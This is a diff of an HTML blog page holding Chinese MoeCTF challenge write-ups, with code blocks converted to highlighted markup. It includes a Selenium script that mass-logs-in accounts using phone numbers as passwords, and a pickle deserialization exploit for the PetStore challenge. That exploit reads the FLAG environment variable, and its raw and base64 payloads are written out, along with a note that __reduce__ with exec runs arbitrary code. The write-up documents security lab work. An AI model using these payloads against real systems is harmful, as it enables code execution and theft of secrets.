+    <span class="s2">&quot;4&quot;</span><span class="p">:</span> <span class="s2">&quot;东南方&quot;</span><span class="p">,</span>
+    <span class="s2">&quot;5&quot;</span><span class="p">:</span> <span class="s2">&quot;南方&quot;</span><span class="p">,</span>
+    <span class="s2">&quot;6&quot;</span><span class="p">:</span> <span class="s2">&quot;西南方&quot;</span><span class="p">,</span>
+    <span class="s2">&quot;7&quot;</span><span class="p">:</span> <span class="s2">&quot;西方&quot;</span><span class="p">,</span>
+    <span class="s2">&quot;8&quot;</span><span class="p">:</span> <span class="s2">&quot;西北方&quot;</span>
+<span class="p">}</span>
 
-session = requests.Session()
-response = session.post(url, data=data)
+<span class="n">session</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">Session</span><span class="p">()</span>
+<span class="n">response</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
 
-print(response.text)
+<span class="nb">print</span><span class="p">(</span><span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
 
-for i in range(5):   
-    # 解析返回的HTML内容
-    soup = BeautifulSoup(response.text, 'html.parser')
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">5</span><span class="p">):</span>   
+    <span class="c1"># 解析返回的HTML内容</span>
+    <span class="n">soup</span> <span class="o">=</span> <span class="n">BeautifulSoup</span><span class="p">(</span><span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="p">,</span> <span class="s1">&#39;html.parser&#39;</span><span class="p">)</span>
 
-    # 查找&lt;h1 id=&quot;status&quot;&gt;标签
-    status_h1 = soup.find('h1', id='status')
-    status_text = status_h1.get_text().strip()
-    status_list = status_text.split(&quot;, &quot;)
-    if len(status_list) == 1:
-        result = dict[status_text]
-    else:
-        result = f'{dict[status_list[0]]}一个，{dict[status_list[1]]}一个'
-    data = {
-    &quot;player&quot;: &quot;1&quot;,
-    &quot;direct&quot;: result
-    }
-    response = session.post(url, data=data)
-    print(response.text)
-</code></pre>
+    <span class="c1"># 查找&lt;h1 id=&quot;status&quot;&gt;标签</span>
+    <span class="n">status_h1</span> <span class="o">=</span> <span class="n">soup</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="s1">&#39;h1&#39;</span><span class="p">,</span> <span class="nb">id</span><span class="o">=</span><span class="s1">&#39;status&#39;</span><span class="p">)</span>
+    <span class="n">status_text</span> <span class="o">=</span> <span class="n">status_h1</span><span class="o">.</span><span class="n">get_text</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
+    <span class="n">status_list</span> <span class="o">=</span> <span class="n">status_text</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&quot;, &quot;</span><span class="p">)</span>
+    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">status_list</span><span class="p">)</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
+        <span class="n">result</span> <span class="o">=</span> <span class="nb">dict</span><span class="p">[</span><span class="n">status_text</span><span class="p">]</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="n">result</span> <span class="o">=</span> <span class="sa">f</span><span class="s1">&#39;</span><span class="si">{</span><span class="nb">dict</span><span class="p">[</span><span class="n">status_list</span><span class="p">[</span><span class="mi">0</span><span class="p">]]</span><span class="si">}</span><span class="s1">一个，</span><span class="si">{</span><span class="nb">dict</span><span class="p">[</span><span class="n">status_list</span><span class="p">[</span><span class="mi">1</span><span class="p">]]</span><span class="si">}</span><span class="s1">一个&#39;</span>
+    <span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
+    <span class="s2">&quot;player&quot;</span><span class="p">:</span> <span class="s2">&quot;1&quot;</span><span class="p">,</span>
+    <span class="s2">&quot;direct&quot;</span><span class="p">:</span> <span class="n">result</span>
+    <span class="p">}</span>
+    <span class="n">response</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
+    <span class="nb">print</span><span class="p">(</span><span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
+</code></pre></div>
 <p>执行得到 flag：<code>moectf{WelII1_yOU-p@5s_Th3_ChA1IenGe-frrRRRoM-TonrEn11}</code>。</p>
 <h4 id="re-xdu">Re: 从零开始的 XDU 教书生活</h4>
 <p>准备工作：本题我使用 <a href="https://github.com/gildas-lormeau/SingleFile-MV3">SingleFile</a> 浏览器插件下载动态加载的网页，然后分析静态文件来获取所有的学生 ID，以免去繁杂的动态获取 ID。为了做到这个，首先要使用管理员账号登录签到界面之后在未签页面下滑直至加载完全，然后点击插件下载网页，放入脚本文件夹以便分析。</p>
-<pre><code class="language-python"># http://127.0.0.1:8888/login 为登录界面
-# 从登录界面以学生身份登录之后进入二维码扫描所得网址即可完成签到
-# 解析所有学生用户名直接分析 SingleFile 插件下载的静态文件
+<div class="highlight"><pre><span></span><code><span class="c1"># http://127.0.0.1:8888/login 为登录界面</span>
+<span class="c1"># 从登录界面以学生身份登录之后进入二维码扫描所得网址即可完成签到</span>
+<span class="c1"># 解析所有学生用户名直接分析 SingleFile 插件下载的静态文件</span>
 
-import threading
-from bs4 import BeautifulSoup
-from selenium import webdriver
-from selenium.webdriver.common.by import By
-from selenium.webdriver.chrome.options import Options
-import time
-from urllib.parse import unquote
-import concurrent.futures
+<span class="kn">import</span> <span class="nn">threading</span>
+<span class="kn">from</span> <span class="nn">bs4</span> <span class="kn">import</span> <span class="n">BeautifulSoup</span>
+<span class="kn">from</span> <span class="nn">selenium</span> <span class="kn">import</span> <span class="n">webdriver</span>
+<span class="kn">from</span> <span class="nn">selenium.webdriver.common.by</span> <span class="kn">import</span> <span class="n">By</span>
+<span class="kn">from</span> <span class="nn">selenium.webdriver.chrome.options</span> <span class="kn">import</span> <span class="n">Options</span>
+<span class="kn">import</span> <span class="nn">time</span>
+<span class="kn">from</span> <span class="nn">urllib.parse</span> <span class="kn">import</span> <span class="n">unquote</span>
+<span class="kn">import</span> <span class="nn">concurrent.futures</span>
 
-url = 'http://127.0.0.1:7100/login' # 替换为登录页的URL
+<span class="n">url</span> <span class="o">=</span> <span class="s1">&#39;http://127.0.0.1:7100/login&#39;</span> <span class="c1"># 替换为登录页的URL</span>
 
-def getUser():# 打开并读取本地HTML文件
-    with open('RE0_School.html', 'r', encoding='utf-8') as file:
-        html_content = file.read()
+<span class="k">def</span> <span class="nf">getUser</span><span class="p">():</span><span class="c1"># 打开并读取本地HTML文件</span>
+    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;RE0_School.html&#39;</span><span class="p">,</span> <span class="s1">&#39;r&#39;</span><span class="p">,</span> <span class="n">encoding</span><span class="o">=</span><span class="s1">&#39;utf-8&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">file</span><span class="p">:</span>
+        <span class="n">html_content</span> <span class="o">=</span> <span class="n">file</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
 
-    # 解析HTML文件内容
-    soup = BeautifulSoup(html_content, 'lxml')
+    <span class="c1"># 解析HTML文件内容</span>
+    <span class="n">soup</span> <span class="o">=</span> <span class="n">BeautifulSoup</span><span class="p">(</span><span class="n">html_content</span><span class="p">,</span> <span class="s1">&#39;lxml&#39;</span><span class="p">)</span>
 
-    # 找到所有符合 &lt;p class=&quot;name words&quot;&gt; 的元素
-    p_tags = soup.find_all('p', class_='name words')
+    <span class="c1"># 找到所有符合 &lt;p class=&quot;name words&quot;&gt; 的元素</span>
+    <span class="n">p_tags</span> <span class="o">=</span> <span class="n">soup</span><span class="o">.</span><span class="n">find_all</span><span class="p">(</span><span class="s1">&#39;p&#39;</span><span class="p">,</span> <span class="n">class_</span><span class="o">=</span><span class="s1">&#39;name words&#39;</span><span class="p">)</span>
 
-    # 提取每个标签的文本内容并保存到列表中
-    content_list = [p.get_text() for p in p_tags]
+    <span class="c1"># 提取每个标签的文本内容并保存到列表中</span>
+    <span class="n">content_list</span> <span class="o">=</span> <span class="p">[</span><span class="n">p</span><span class="o">.</span><span class="n">get_text</span><span class="p">()</span> <span class="k">for</span> <span class="n">p</span> <span class="ow">in</span> <span class="n">p_tags</span><span class="p">]</span>
 
-    return content_list
+    <span class="k">return</span> <span class="n">content_list</span>
 
-def login(phone):
-    opt = Options()
-    opt.add_argument('--headless')
-    opt.add_argument('--disable-gpu')
-    browser = webdriver.Chrome(options=opt)
+<span class="k">def</span> <span class="nf">login</span><span class="p">(</span><span class="n">phone</span><span class="p">):</span>
+    <span class="n">opt</span> <span class="o">=</span> <span class="n">Options</span><span class="p">()</span>
+    <span class="n">opt</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s1">&#39;--headless&#39;</span><span class="p">)</span>
+    <span class="n">opt</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s1">&#39;--disable-gpu&#39;</span><span class="p">)</span>
+    <span class="n">browser</span> <span class="o">=</span> <span class="n">webdriver</span><span class="o">.</span><span class="n">Chrome</span><span class="p">(</span><span class="n">options</span><span class="o">=</span><span class="n">opt</span><span class="p">)</span>
 
-    browser.get(url=url)
+    <span class="n">browser</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">url</span><span class="p">)</span>
 
-    browser.find_element(by=By.ID, value=&quot;phone&quot;).send_keys(phone)
-    browser.find_element(by=By.ID, value=&quot;pwd&quot;).send_keys(phone)
-    browser.find_element(by=By.ID, value=&quot;loginBtn&quot;).click()
-    time.sleep(1)
-    browser.get(QRCodeURL)
-    # browser.quit() # 不知道为啥这里注释掉比不注释效果好。
+    <span class="n">browser</span><span class="o">.</span><span class="n">find_element</span><span class="p">(</span><span class="n">by</span><span class="o">=</span><span class="n">By</span><span class="o">.</span><span class="n">ID</span><span class="p">,</span> <span class="n">value</span><span class="o">=</span><span class="s2">&quot;phone&quot;</span><span class="p">)</span><span class="o">.</span><span class="n">send_keys</span><span class="p">(</span><span class="n">phone</span><span class="p">)</span>
+    <span class="n">browser</span><span class="o">.</span><span class="n">find_element</span><span class="p">(</span><span class="n">by</span><span class="o">=</span><span class="n">By</span><span class="o">.</span><span class="n">ID</span><span class="p">,</span> <span class="n">value</span><span class="o">=</span><span class="s2">&quot;pwd&quot;</span><span class="p">)</span><span class="o">.</span><span class="n">send_keys</span><span class="p">(</span><span class="n">phone</span><span class="p">)</span>
+    <span class="n">browser</span><span class="o">.</span><span class="n">find_element</span><span class="p">(</span><span class="n">by</span><span class="o">=</span><span class="n">By</span><span class="o">.</span><span class="n">ID</span><span class="p">,</span> <span class="n">value</span><span class="o">=</span><span class="s2">&quot;loginBtn&quot;</span><span class="p">)</span><span class="o">.</span><span class="n">click</span><span class="p">()</span>
+    <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+    <span class="n">browser</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">QRCodeURL</span><span class="p">)</span>
+    <span class="c1"># browser.quit() # 不知道为啥这里注释掉比不注释效果好。</span>
 
-# 定义一个全局变量，用于保存src属性
-QRCodeURL = None
+<span class="c1"># 定义一个全局变量，用于保存src属性</span>
+<span class="n">QRCodeURL</span> <span class="o">=</span> <span class="kc">None</span>
 
-# 定义一个线程函数，持续获取 src 属性
-def fetch_src():
-    global QRCodeURL
-    driver = webdriver.Chrome()  # 初始化 WebDriver
-    driver.get(url=url)
+<span class="c1"># 定义一个线程函数，持续获取 src 属性</span>
+<span class="k">def</span> <span class="nf">fetch_src</span><span class="p">():</span>
+    <span class="k">global</span> <span class="n">QRCodeURL</span>
+    <span class="n">driver</span> <span class="o">=</span> <span class="n">webdriver</span><span class="o">.</span><span class="n">Chrome</span><span class="p">()</span>  <span class="c1"># 初始化 WebDriver</span>
+    <span class="n">driver</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">url</span><span class="p">)</span>
 
-    driver.find_element(by=By.ID, value=&quot;phone&quot;).send_keys(&quot;10000&quot;)
-    driver.find_element(by=By.ID, value=&quot;pwd&quot;).send_keys(&quot;10000&quot;)
-    driver.find_element(by=By.ID, value=&quot;loginBtn&quot;).click()
-    time.sleep(2)
+    <span class="n">driver</span><span class="o">.</span><span class="n">find_element</span><span class="p">(</span><span class="n">by</span><span class="o">=</span><span class="n">By</span><span class="o">.</span><span class="n">ID</span><span class="p">,</span> <span class="n">value</span><span class="o">=</span><span class="s2">&quot;phone&quot;</span><span class="p">)</span><span class="o">.</span><span class="n">send_keys</span><span class="p">(</span><span class="s2">&quot;10000&quot;</span><span class="p">)</span>
+    <span class="n">driver</span><span class="o">.</span><span class="n">find_element</span><span class="p">(</span><span class="n">by</span><span class="o">=</span><span class="n">By</span><span class="o">.</span><span class="n">ID</span><span class="p">,</span> <span class="n">value</span><span class="o">=</span><span class="s2">&quot;pwd&quot;</span><span class="p">)</span><span class="o">.</span><span class="n">send_keys</span><span class="p">(</span><span class="s2">&quot;10000&quot;</span><span class="p">)</span>
+    <span class="n">driver</span><span class="o">.</span><span class="n">find_element</span><span class="p">(</span><span class="n">by</span><span class="o">=</span><span class="n">By</span><span class="o">.</span><span class="n">ID</span><span class="p">,</span> <span class="n">value</span><span class="o">=</span><span class="s2">&quot;loginBtn&quot;</span><span class="p">)</span><span class="o">.</span><span class="n">click</span><span class="p">()</span>
+    <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
 
-    while True:
-        # 定位元素并获取 src 属性
-        img_element = driver.find_element(By.ID, &quot;qrcode&quot;)
-        QRCodeURL = img_element.get_attribute(&quot;src&quot;)[62:]
-        QRCodeURL = unquote(QRCodeURL)
+    <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
+        <span class="c1"># 定位元素并获取 src 属性</span>
+        <span class="n">img_element</span> <span class="o">=</span> <span class="n">driver</span><span class="o">.</span><span class="n">find_element</span><span class="p">(</span><span class="n">By</span><span class="o">.</span><span class="n">ID</span><span class="p">,</span> <span class="s2">&quot;qrcode&quot;</span><span class="p">)</span>
+        <span class="n">QRCodeURL</span> <span class="o">=</span> <span class="n">img_element</span><span class="o">.</span><span class="n">get_attribute</span><span class="p">(</span><span class="s2">&quot;src&quot;</span><span class="p">)[</span><span class="mi">62</span><span class="p">:]</span>
+        <span class="n">QRCodeURL</span> <span class="o">=</span> <span class="n">unquote</span><span class="p">(</span><span class="n">QRCodeURL</span><span class="p">)</span>
 
-        # 每10秒获取一次新的 src 属性
-        time.sleep(10)
+        <span class="c1"># 每10秒获取一次新的 src 属性</span>
+        <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">10</span><span class="p">)</span>
 
-# 启动线程来运行 fetch_src 函数
-# 由于不打开网页时不刷新二维码，此处可以简化逻辑，不需要额外线程实时更新二维码链接
-fetch_thread = threading.Thread(target=fetch_src)
-fetch_thread.daemon = True  # 将其设置为守护线程，主线程退出时，子线程会自动退出
-fetch_thread.start()
-time.sleep(3)
+<span class="c1"># 启动线程来运行 fetch_src 函数</span>
+<span class="c1"># 由于不打开网页时不刷新二维码，此处可以简化逻辑，不需要额外线程实时更新二维码链接</span>
+<span class="n">fetch_thread</span> <span class="o">=</span> <span class="n">threading</span><span class="o">.</span><span class="n">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">fetch_src</span><span class="p">)</span>
+<span class="n">fetch_thread</span><span class="o">.</span><span class="n">daemon</span> <span class="o">=</span> <span class="kc">True</span>  <span class="c1"># 将其设置为守护线程，主线程退出时，子线程会自动退出</span>
+<span class="n">fetch_thread</span><span class="o">.</span><span class="n">start</span><span class="p">()</span>
+<span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
 
-# 主线程继续执行其他逻辑，不受fetch_src函数的阻塞
+<span class="c1"># 主线程继续执行其他逻辑，不受fetch_src函数的阻塞</span>
 
-userList = getUser()
+<span class="n">userList</span> <span class="o">=</span> <span class="n">getUser</span><span class="p">()</span>
 
-# 使用 ThreadPoolExecutor 创建 16 个线程
-with concurrent.futures.ThreadPoolExecutor(max_workers=16) as executor:
-    executor.map(login, userList)
-</code></pre>
+<span class="c1"># 使用 ThreadPoolExecutor 创建 16 个线程</span>
+<span class="k">with</span> <span class="n">concurrent</span><span class="o">.</span><span class="n">futures</span><span class="o">.</span><span class="n">ThreadPoolExecutor</span><span class="p">(</span><span class="n">max_workers</span><span class="o">=</span><span class="mi">16</span><span class="p">)</span> <span class="k">as</span> <span class="n">executor</span><span class="p">:</span>
+    <span class="n">executor</span><span class="o">.</span><span class="n">map</span><span class="p">(</span><span class="n">login</span><span class="p">,</span> <span class="n">userList</span><span class="p">)</span>
+</code></pre></div>
 <p>执行一次脚本后会有一定的同学没签上，此时重新 SingleFile 下载页面并再次运行脚本即可。</p>
 <p>完成后结束活动得到 flag：<code>moectf{u_aR3_4-g00D_T34ch3R_L0v3D_By_3v3RYOn3357dcb34}</code></p>
 <h4 id="petstore">PetStore</h4>
 <p>分析源码得到其使用了 <code>pickle.loads()</code> 函数，而 pickle 反序列化<strong>能执行任意代码</strong>，是将 opcode 这种特殊代码逐行执行的过程。</p>
 <p>使用 <a href="https://github.com/EddieIvan01/pker">pker.py</a> 构造 opcode，来调用添加宠物的方法，并把 flag 作为宠物名字，以下是 pker.py 的输入。</p>
-<pre><code class="language-python">getattr = GLOBAL('__builtin__', 'getattr')
-dict = GLOBAL('builtins', 'dict')
-get = getattr(dict, 'get')
-mod = GLOBAL('sys', 'modules')
-os = get(mod, 'os')
+<div class="highlight"><pre><span></span><code><span class="nb">getattr</span> <span class="o">=</span> <span class="n">GLOBAL</span><span class="p">(</span><span class="s1">&#39;__builtin__&#39;</span><span class="p">,</span> <span class="s1">&#39;getattr&#39;</span><span class="p">)</span>
+<span class="nb">dict</span> <span class="o">=</span> <span class="n">GLOBAL</span><span class="p">(</span><span class="s1">&#39;builtins&#39;</span><span class="p">,</span> <span class="s1">&#39;dict&#39;</span><span class="p">)</span>
+<span class="n">get</span> <span class="o">=</span> <span class="nb">getattr</span><span class="p">(</span><span class="nb">dict</span><span class="p">,</span> <span class="s1">&#39;get&#39;</span><span class="p">)</span>
+<span class="n">mod</span> <span class="o">=</span> <span class="n">GLOBAL</span><span class="p">(</span><span class="s1">&#39;sys&#39;</span><span class="p">,</span> <span class="s1">&#39;modules&#39;</span><span class="p">)</span>
+<span class="n">os</span> <span class="o">=</span> <span class="n">get</span><span class="p">(</span><span class="n">mod</span><span class="p">,</span> <span class="s1">&#39;os&#39;</span><span class="p">)</span>
 
-store_module = GLOBAL('__main__', 'store')
-create_pet = getattr(store_module, 'create_pet')
+<span class="n">store_module</span> <span class="o">=</span> <span class="n">GLOBAL</span><span class="p">(</span><span class="s1">&#39;__main__&#39;</span><span class="p">,</span> <span class="s1">&#39;store&#39;</span><span class="p">)</span>
+<span class="n">create_pet</span> <span class="o">=</span> <span class="nb">getattr</span><span class="p">(</span><span class="n">store_module</span><span class="p">,</span> <span class="s1">&#39;create_pet&#39;</span><span class="p">)</span>
 
-getenv = getattr(os, 'getenv')
-flag_value = getenv(&quot;FLAG&quot;)
-create_pet(flag_value, &quot;test&quot;)
-return
-</code></pre>
+<span class="n">getenv</span> <span class="o">=</span> <span class="nb">getattr</span><span class="p">(</span><span class="n">os</span><span class="p">,</span> <span class="s1">&#39;getenv&#39;</span><span class="p">)</span>
+<span class="n">flag_value</span> <span class="o">=</span> <span class="n">getenv</span><span class="p">(</span><span class="s2">&quot;FLAG&quot;</span><span class="p">)</span>
+<span class="n">create_pet</span><span class="p">(</span><span class="n">flag_value</span><span class="p">,</span> <span class="s2">&quot;test&quot;</span><span class="p">)</span>
+<span class="k">return</span>
+</code></pre></div>
 <p>输出为 <code>b"c__builtin__\ngetattr\np0\n0cbuiltins\ndict\np1\n0g0\n(g1\nS'get'\ntRp2\n0csys\nmodules\np3\n0g2\n(g3\nS'os'\ntRp4\n0c__main__\nstore\np5\n0g0\n(g5\nS'create_pet'\ntRp6\n0g0\n(g4\nS'getenv'\ntRp7\n0g7\n(S'FLAG'\ntRp8\n0g6\n(g8\nS'test'\ntR."</code>，base64 编码之后结果为 <code>Y19fYnVpbHRpbl9fCmdldGF0dHIKcDAKMGNidWlsdGlucwpkaWN0CnAxCjBnMAooZzEKUydnZXQnCnRScDIKMGNzeXMKbW9kdWxlcwpwMwowZzIKKGczClMnb3MnCnRScDQKMGNfX21haW5fXwpzdG9yZQpwNQowZzAKKGc1ClMnY3JlYXRlX3BldCcKdFJwNgowZzAKKGc0ClMnZ2V0ZW52Jwp0UnA3CjBnNwooUydGTEFHJwp0UnA4CjBnNgooZzgKUyd0ZXN0Jwp0Ui4=</code>。</p>
 <p>将编码后的内容输入进 Import Pet，从宠物名字看见 Flag：<code>moectf{sT4RrYMEow'S_FIAg_H4s-B3En_@CcEPtED-@C@cAc4c3d}</code>。</p>
 <p>改良：在 <code>__reduce__</code> 方法中返回一个 <code>exec</code> 函数来执行任意代码，这样做不需要构造 opcode。</p>
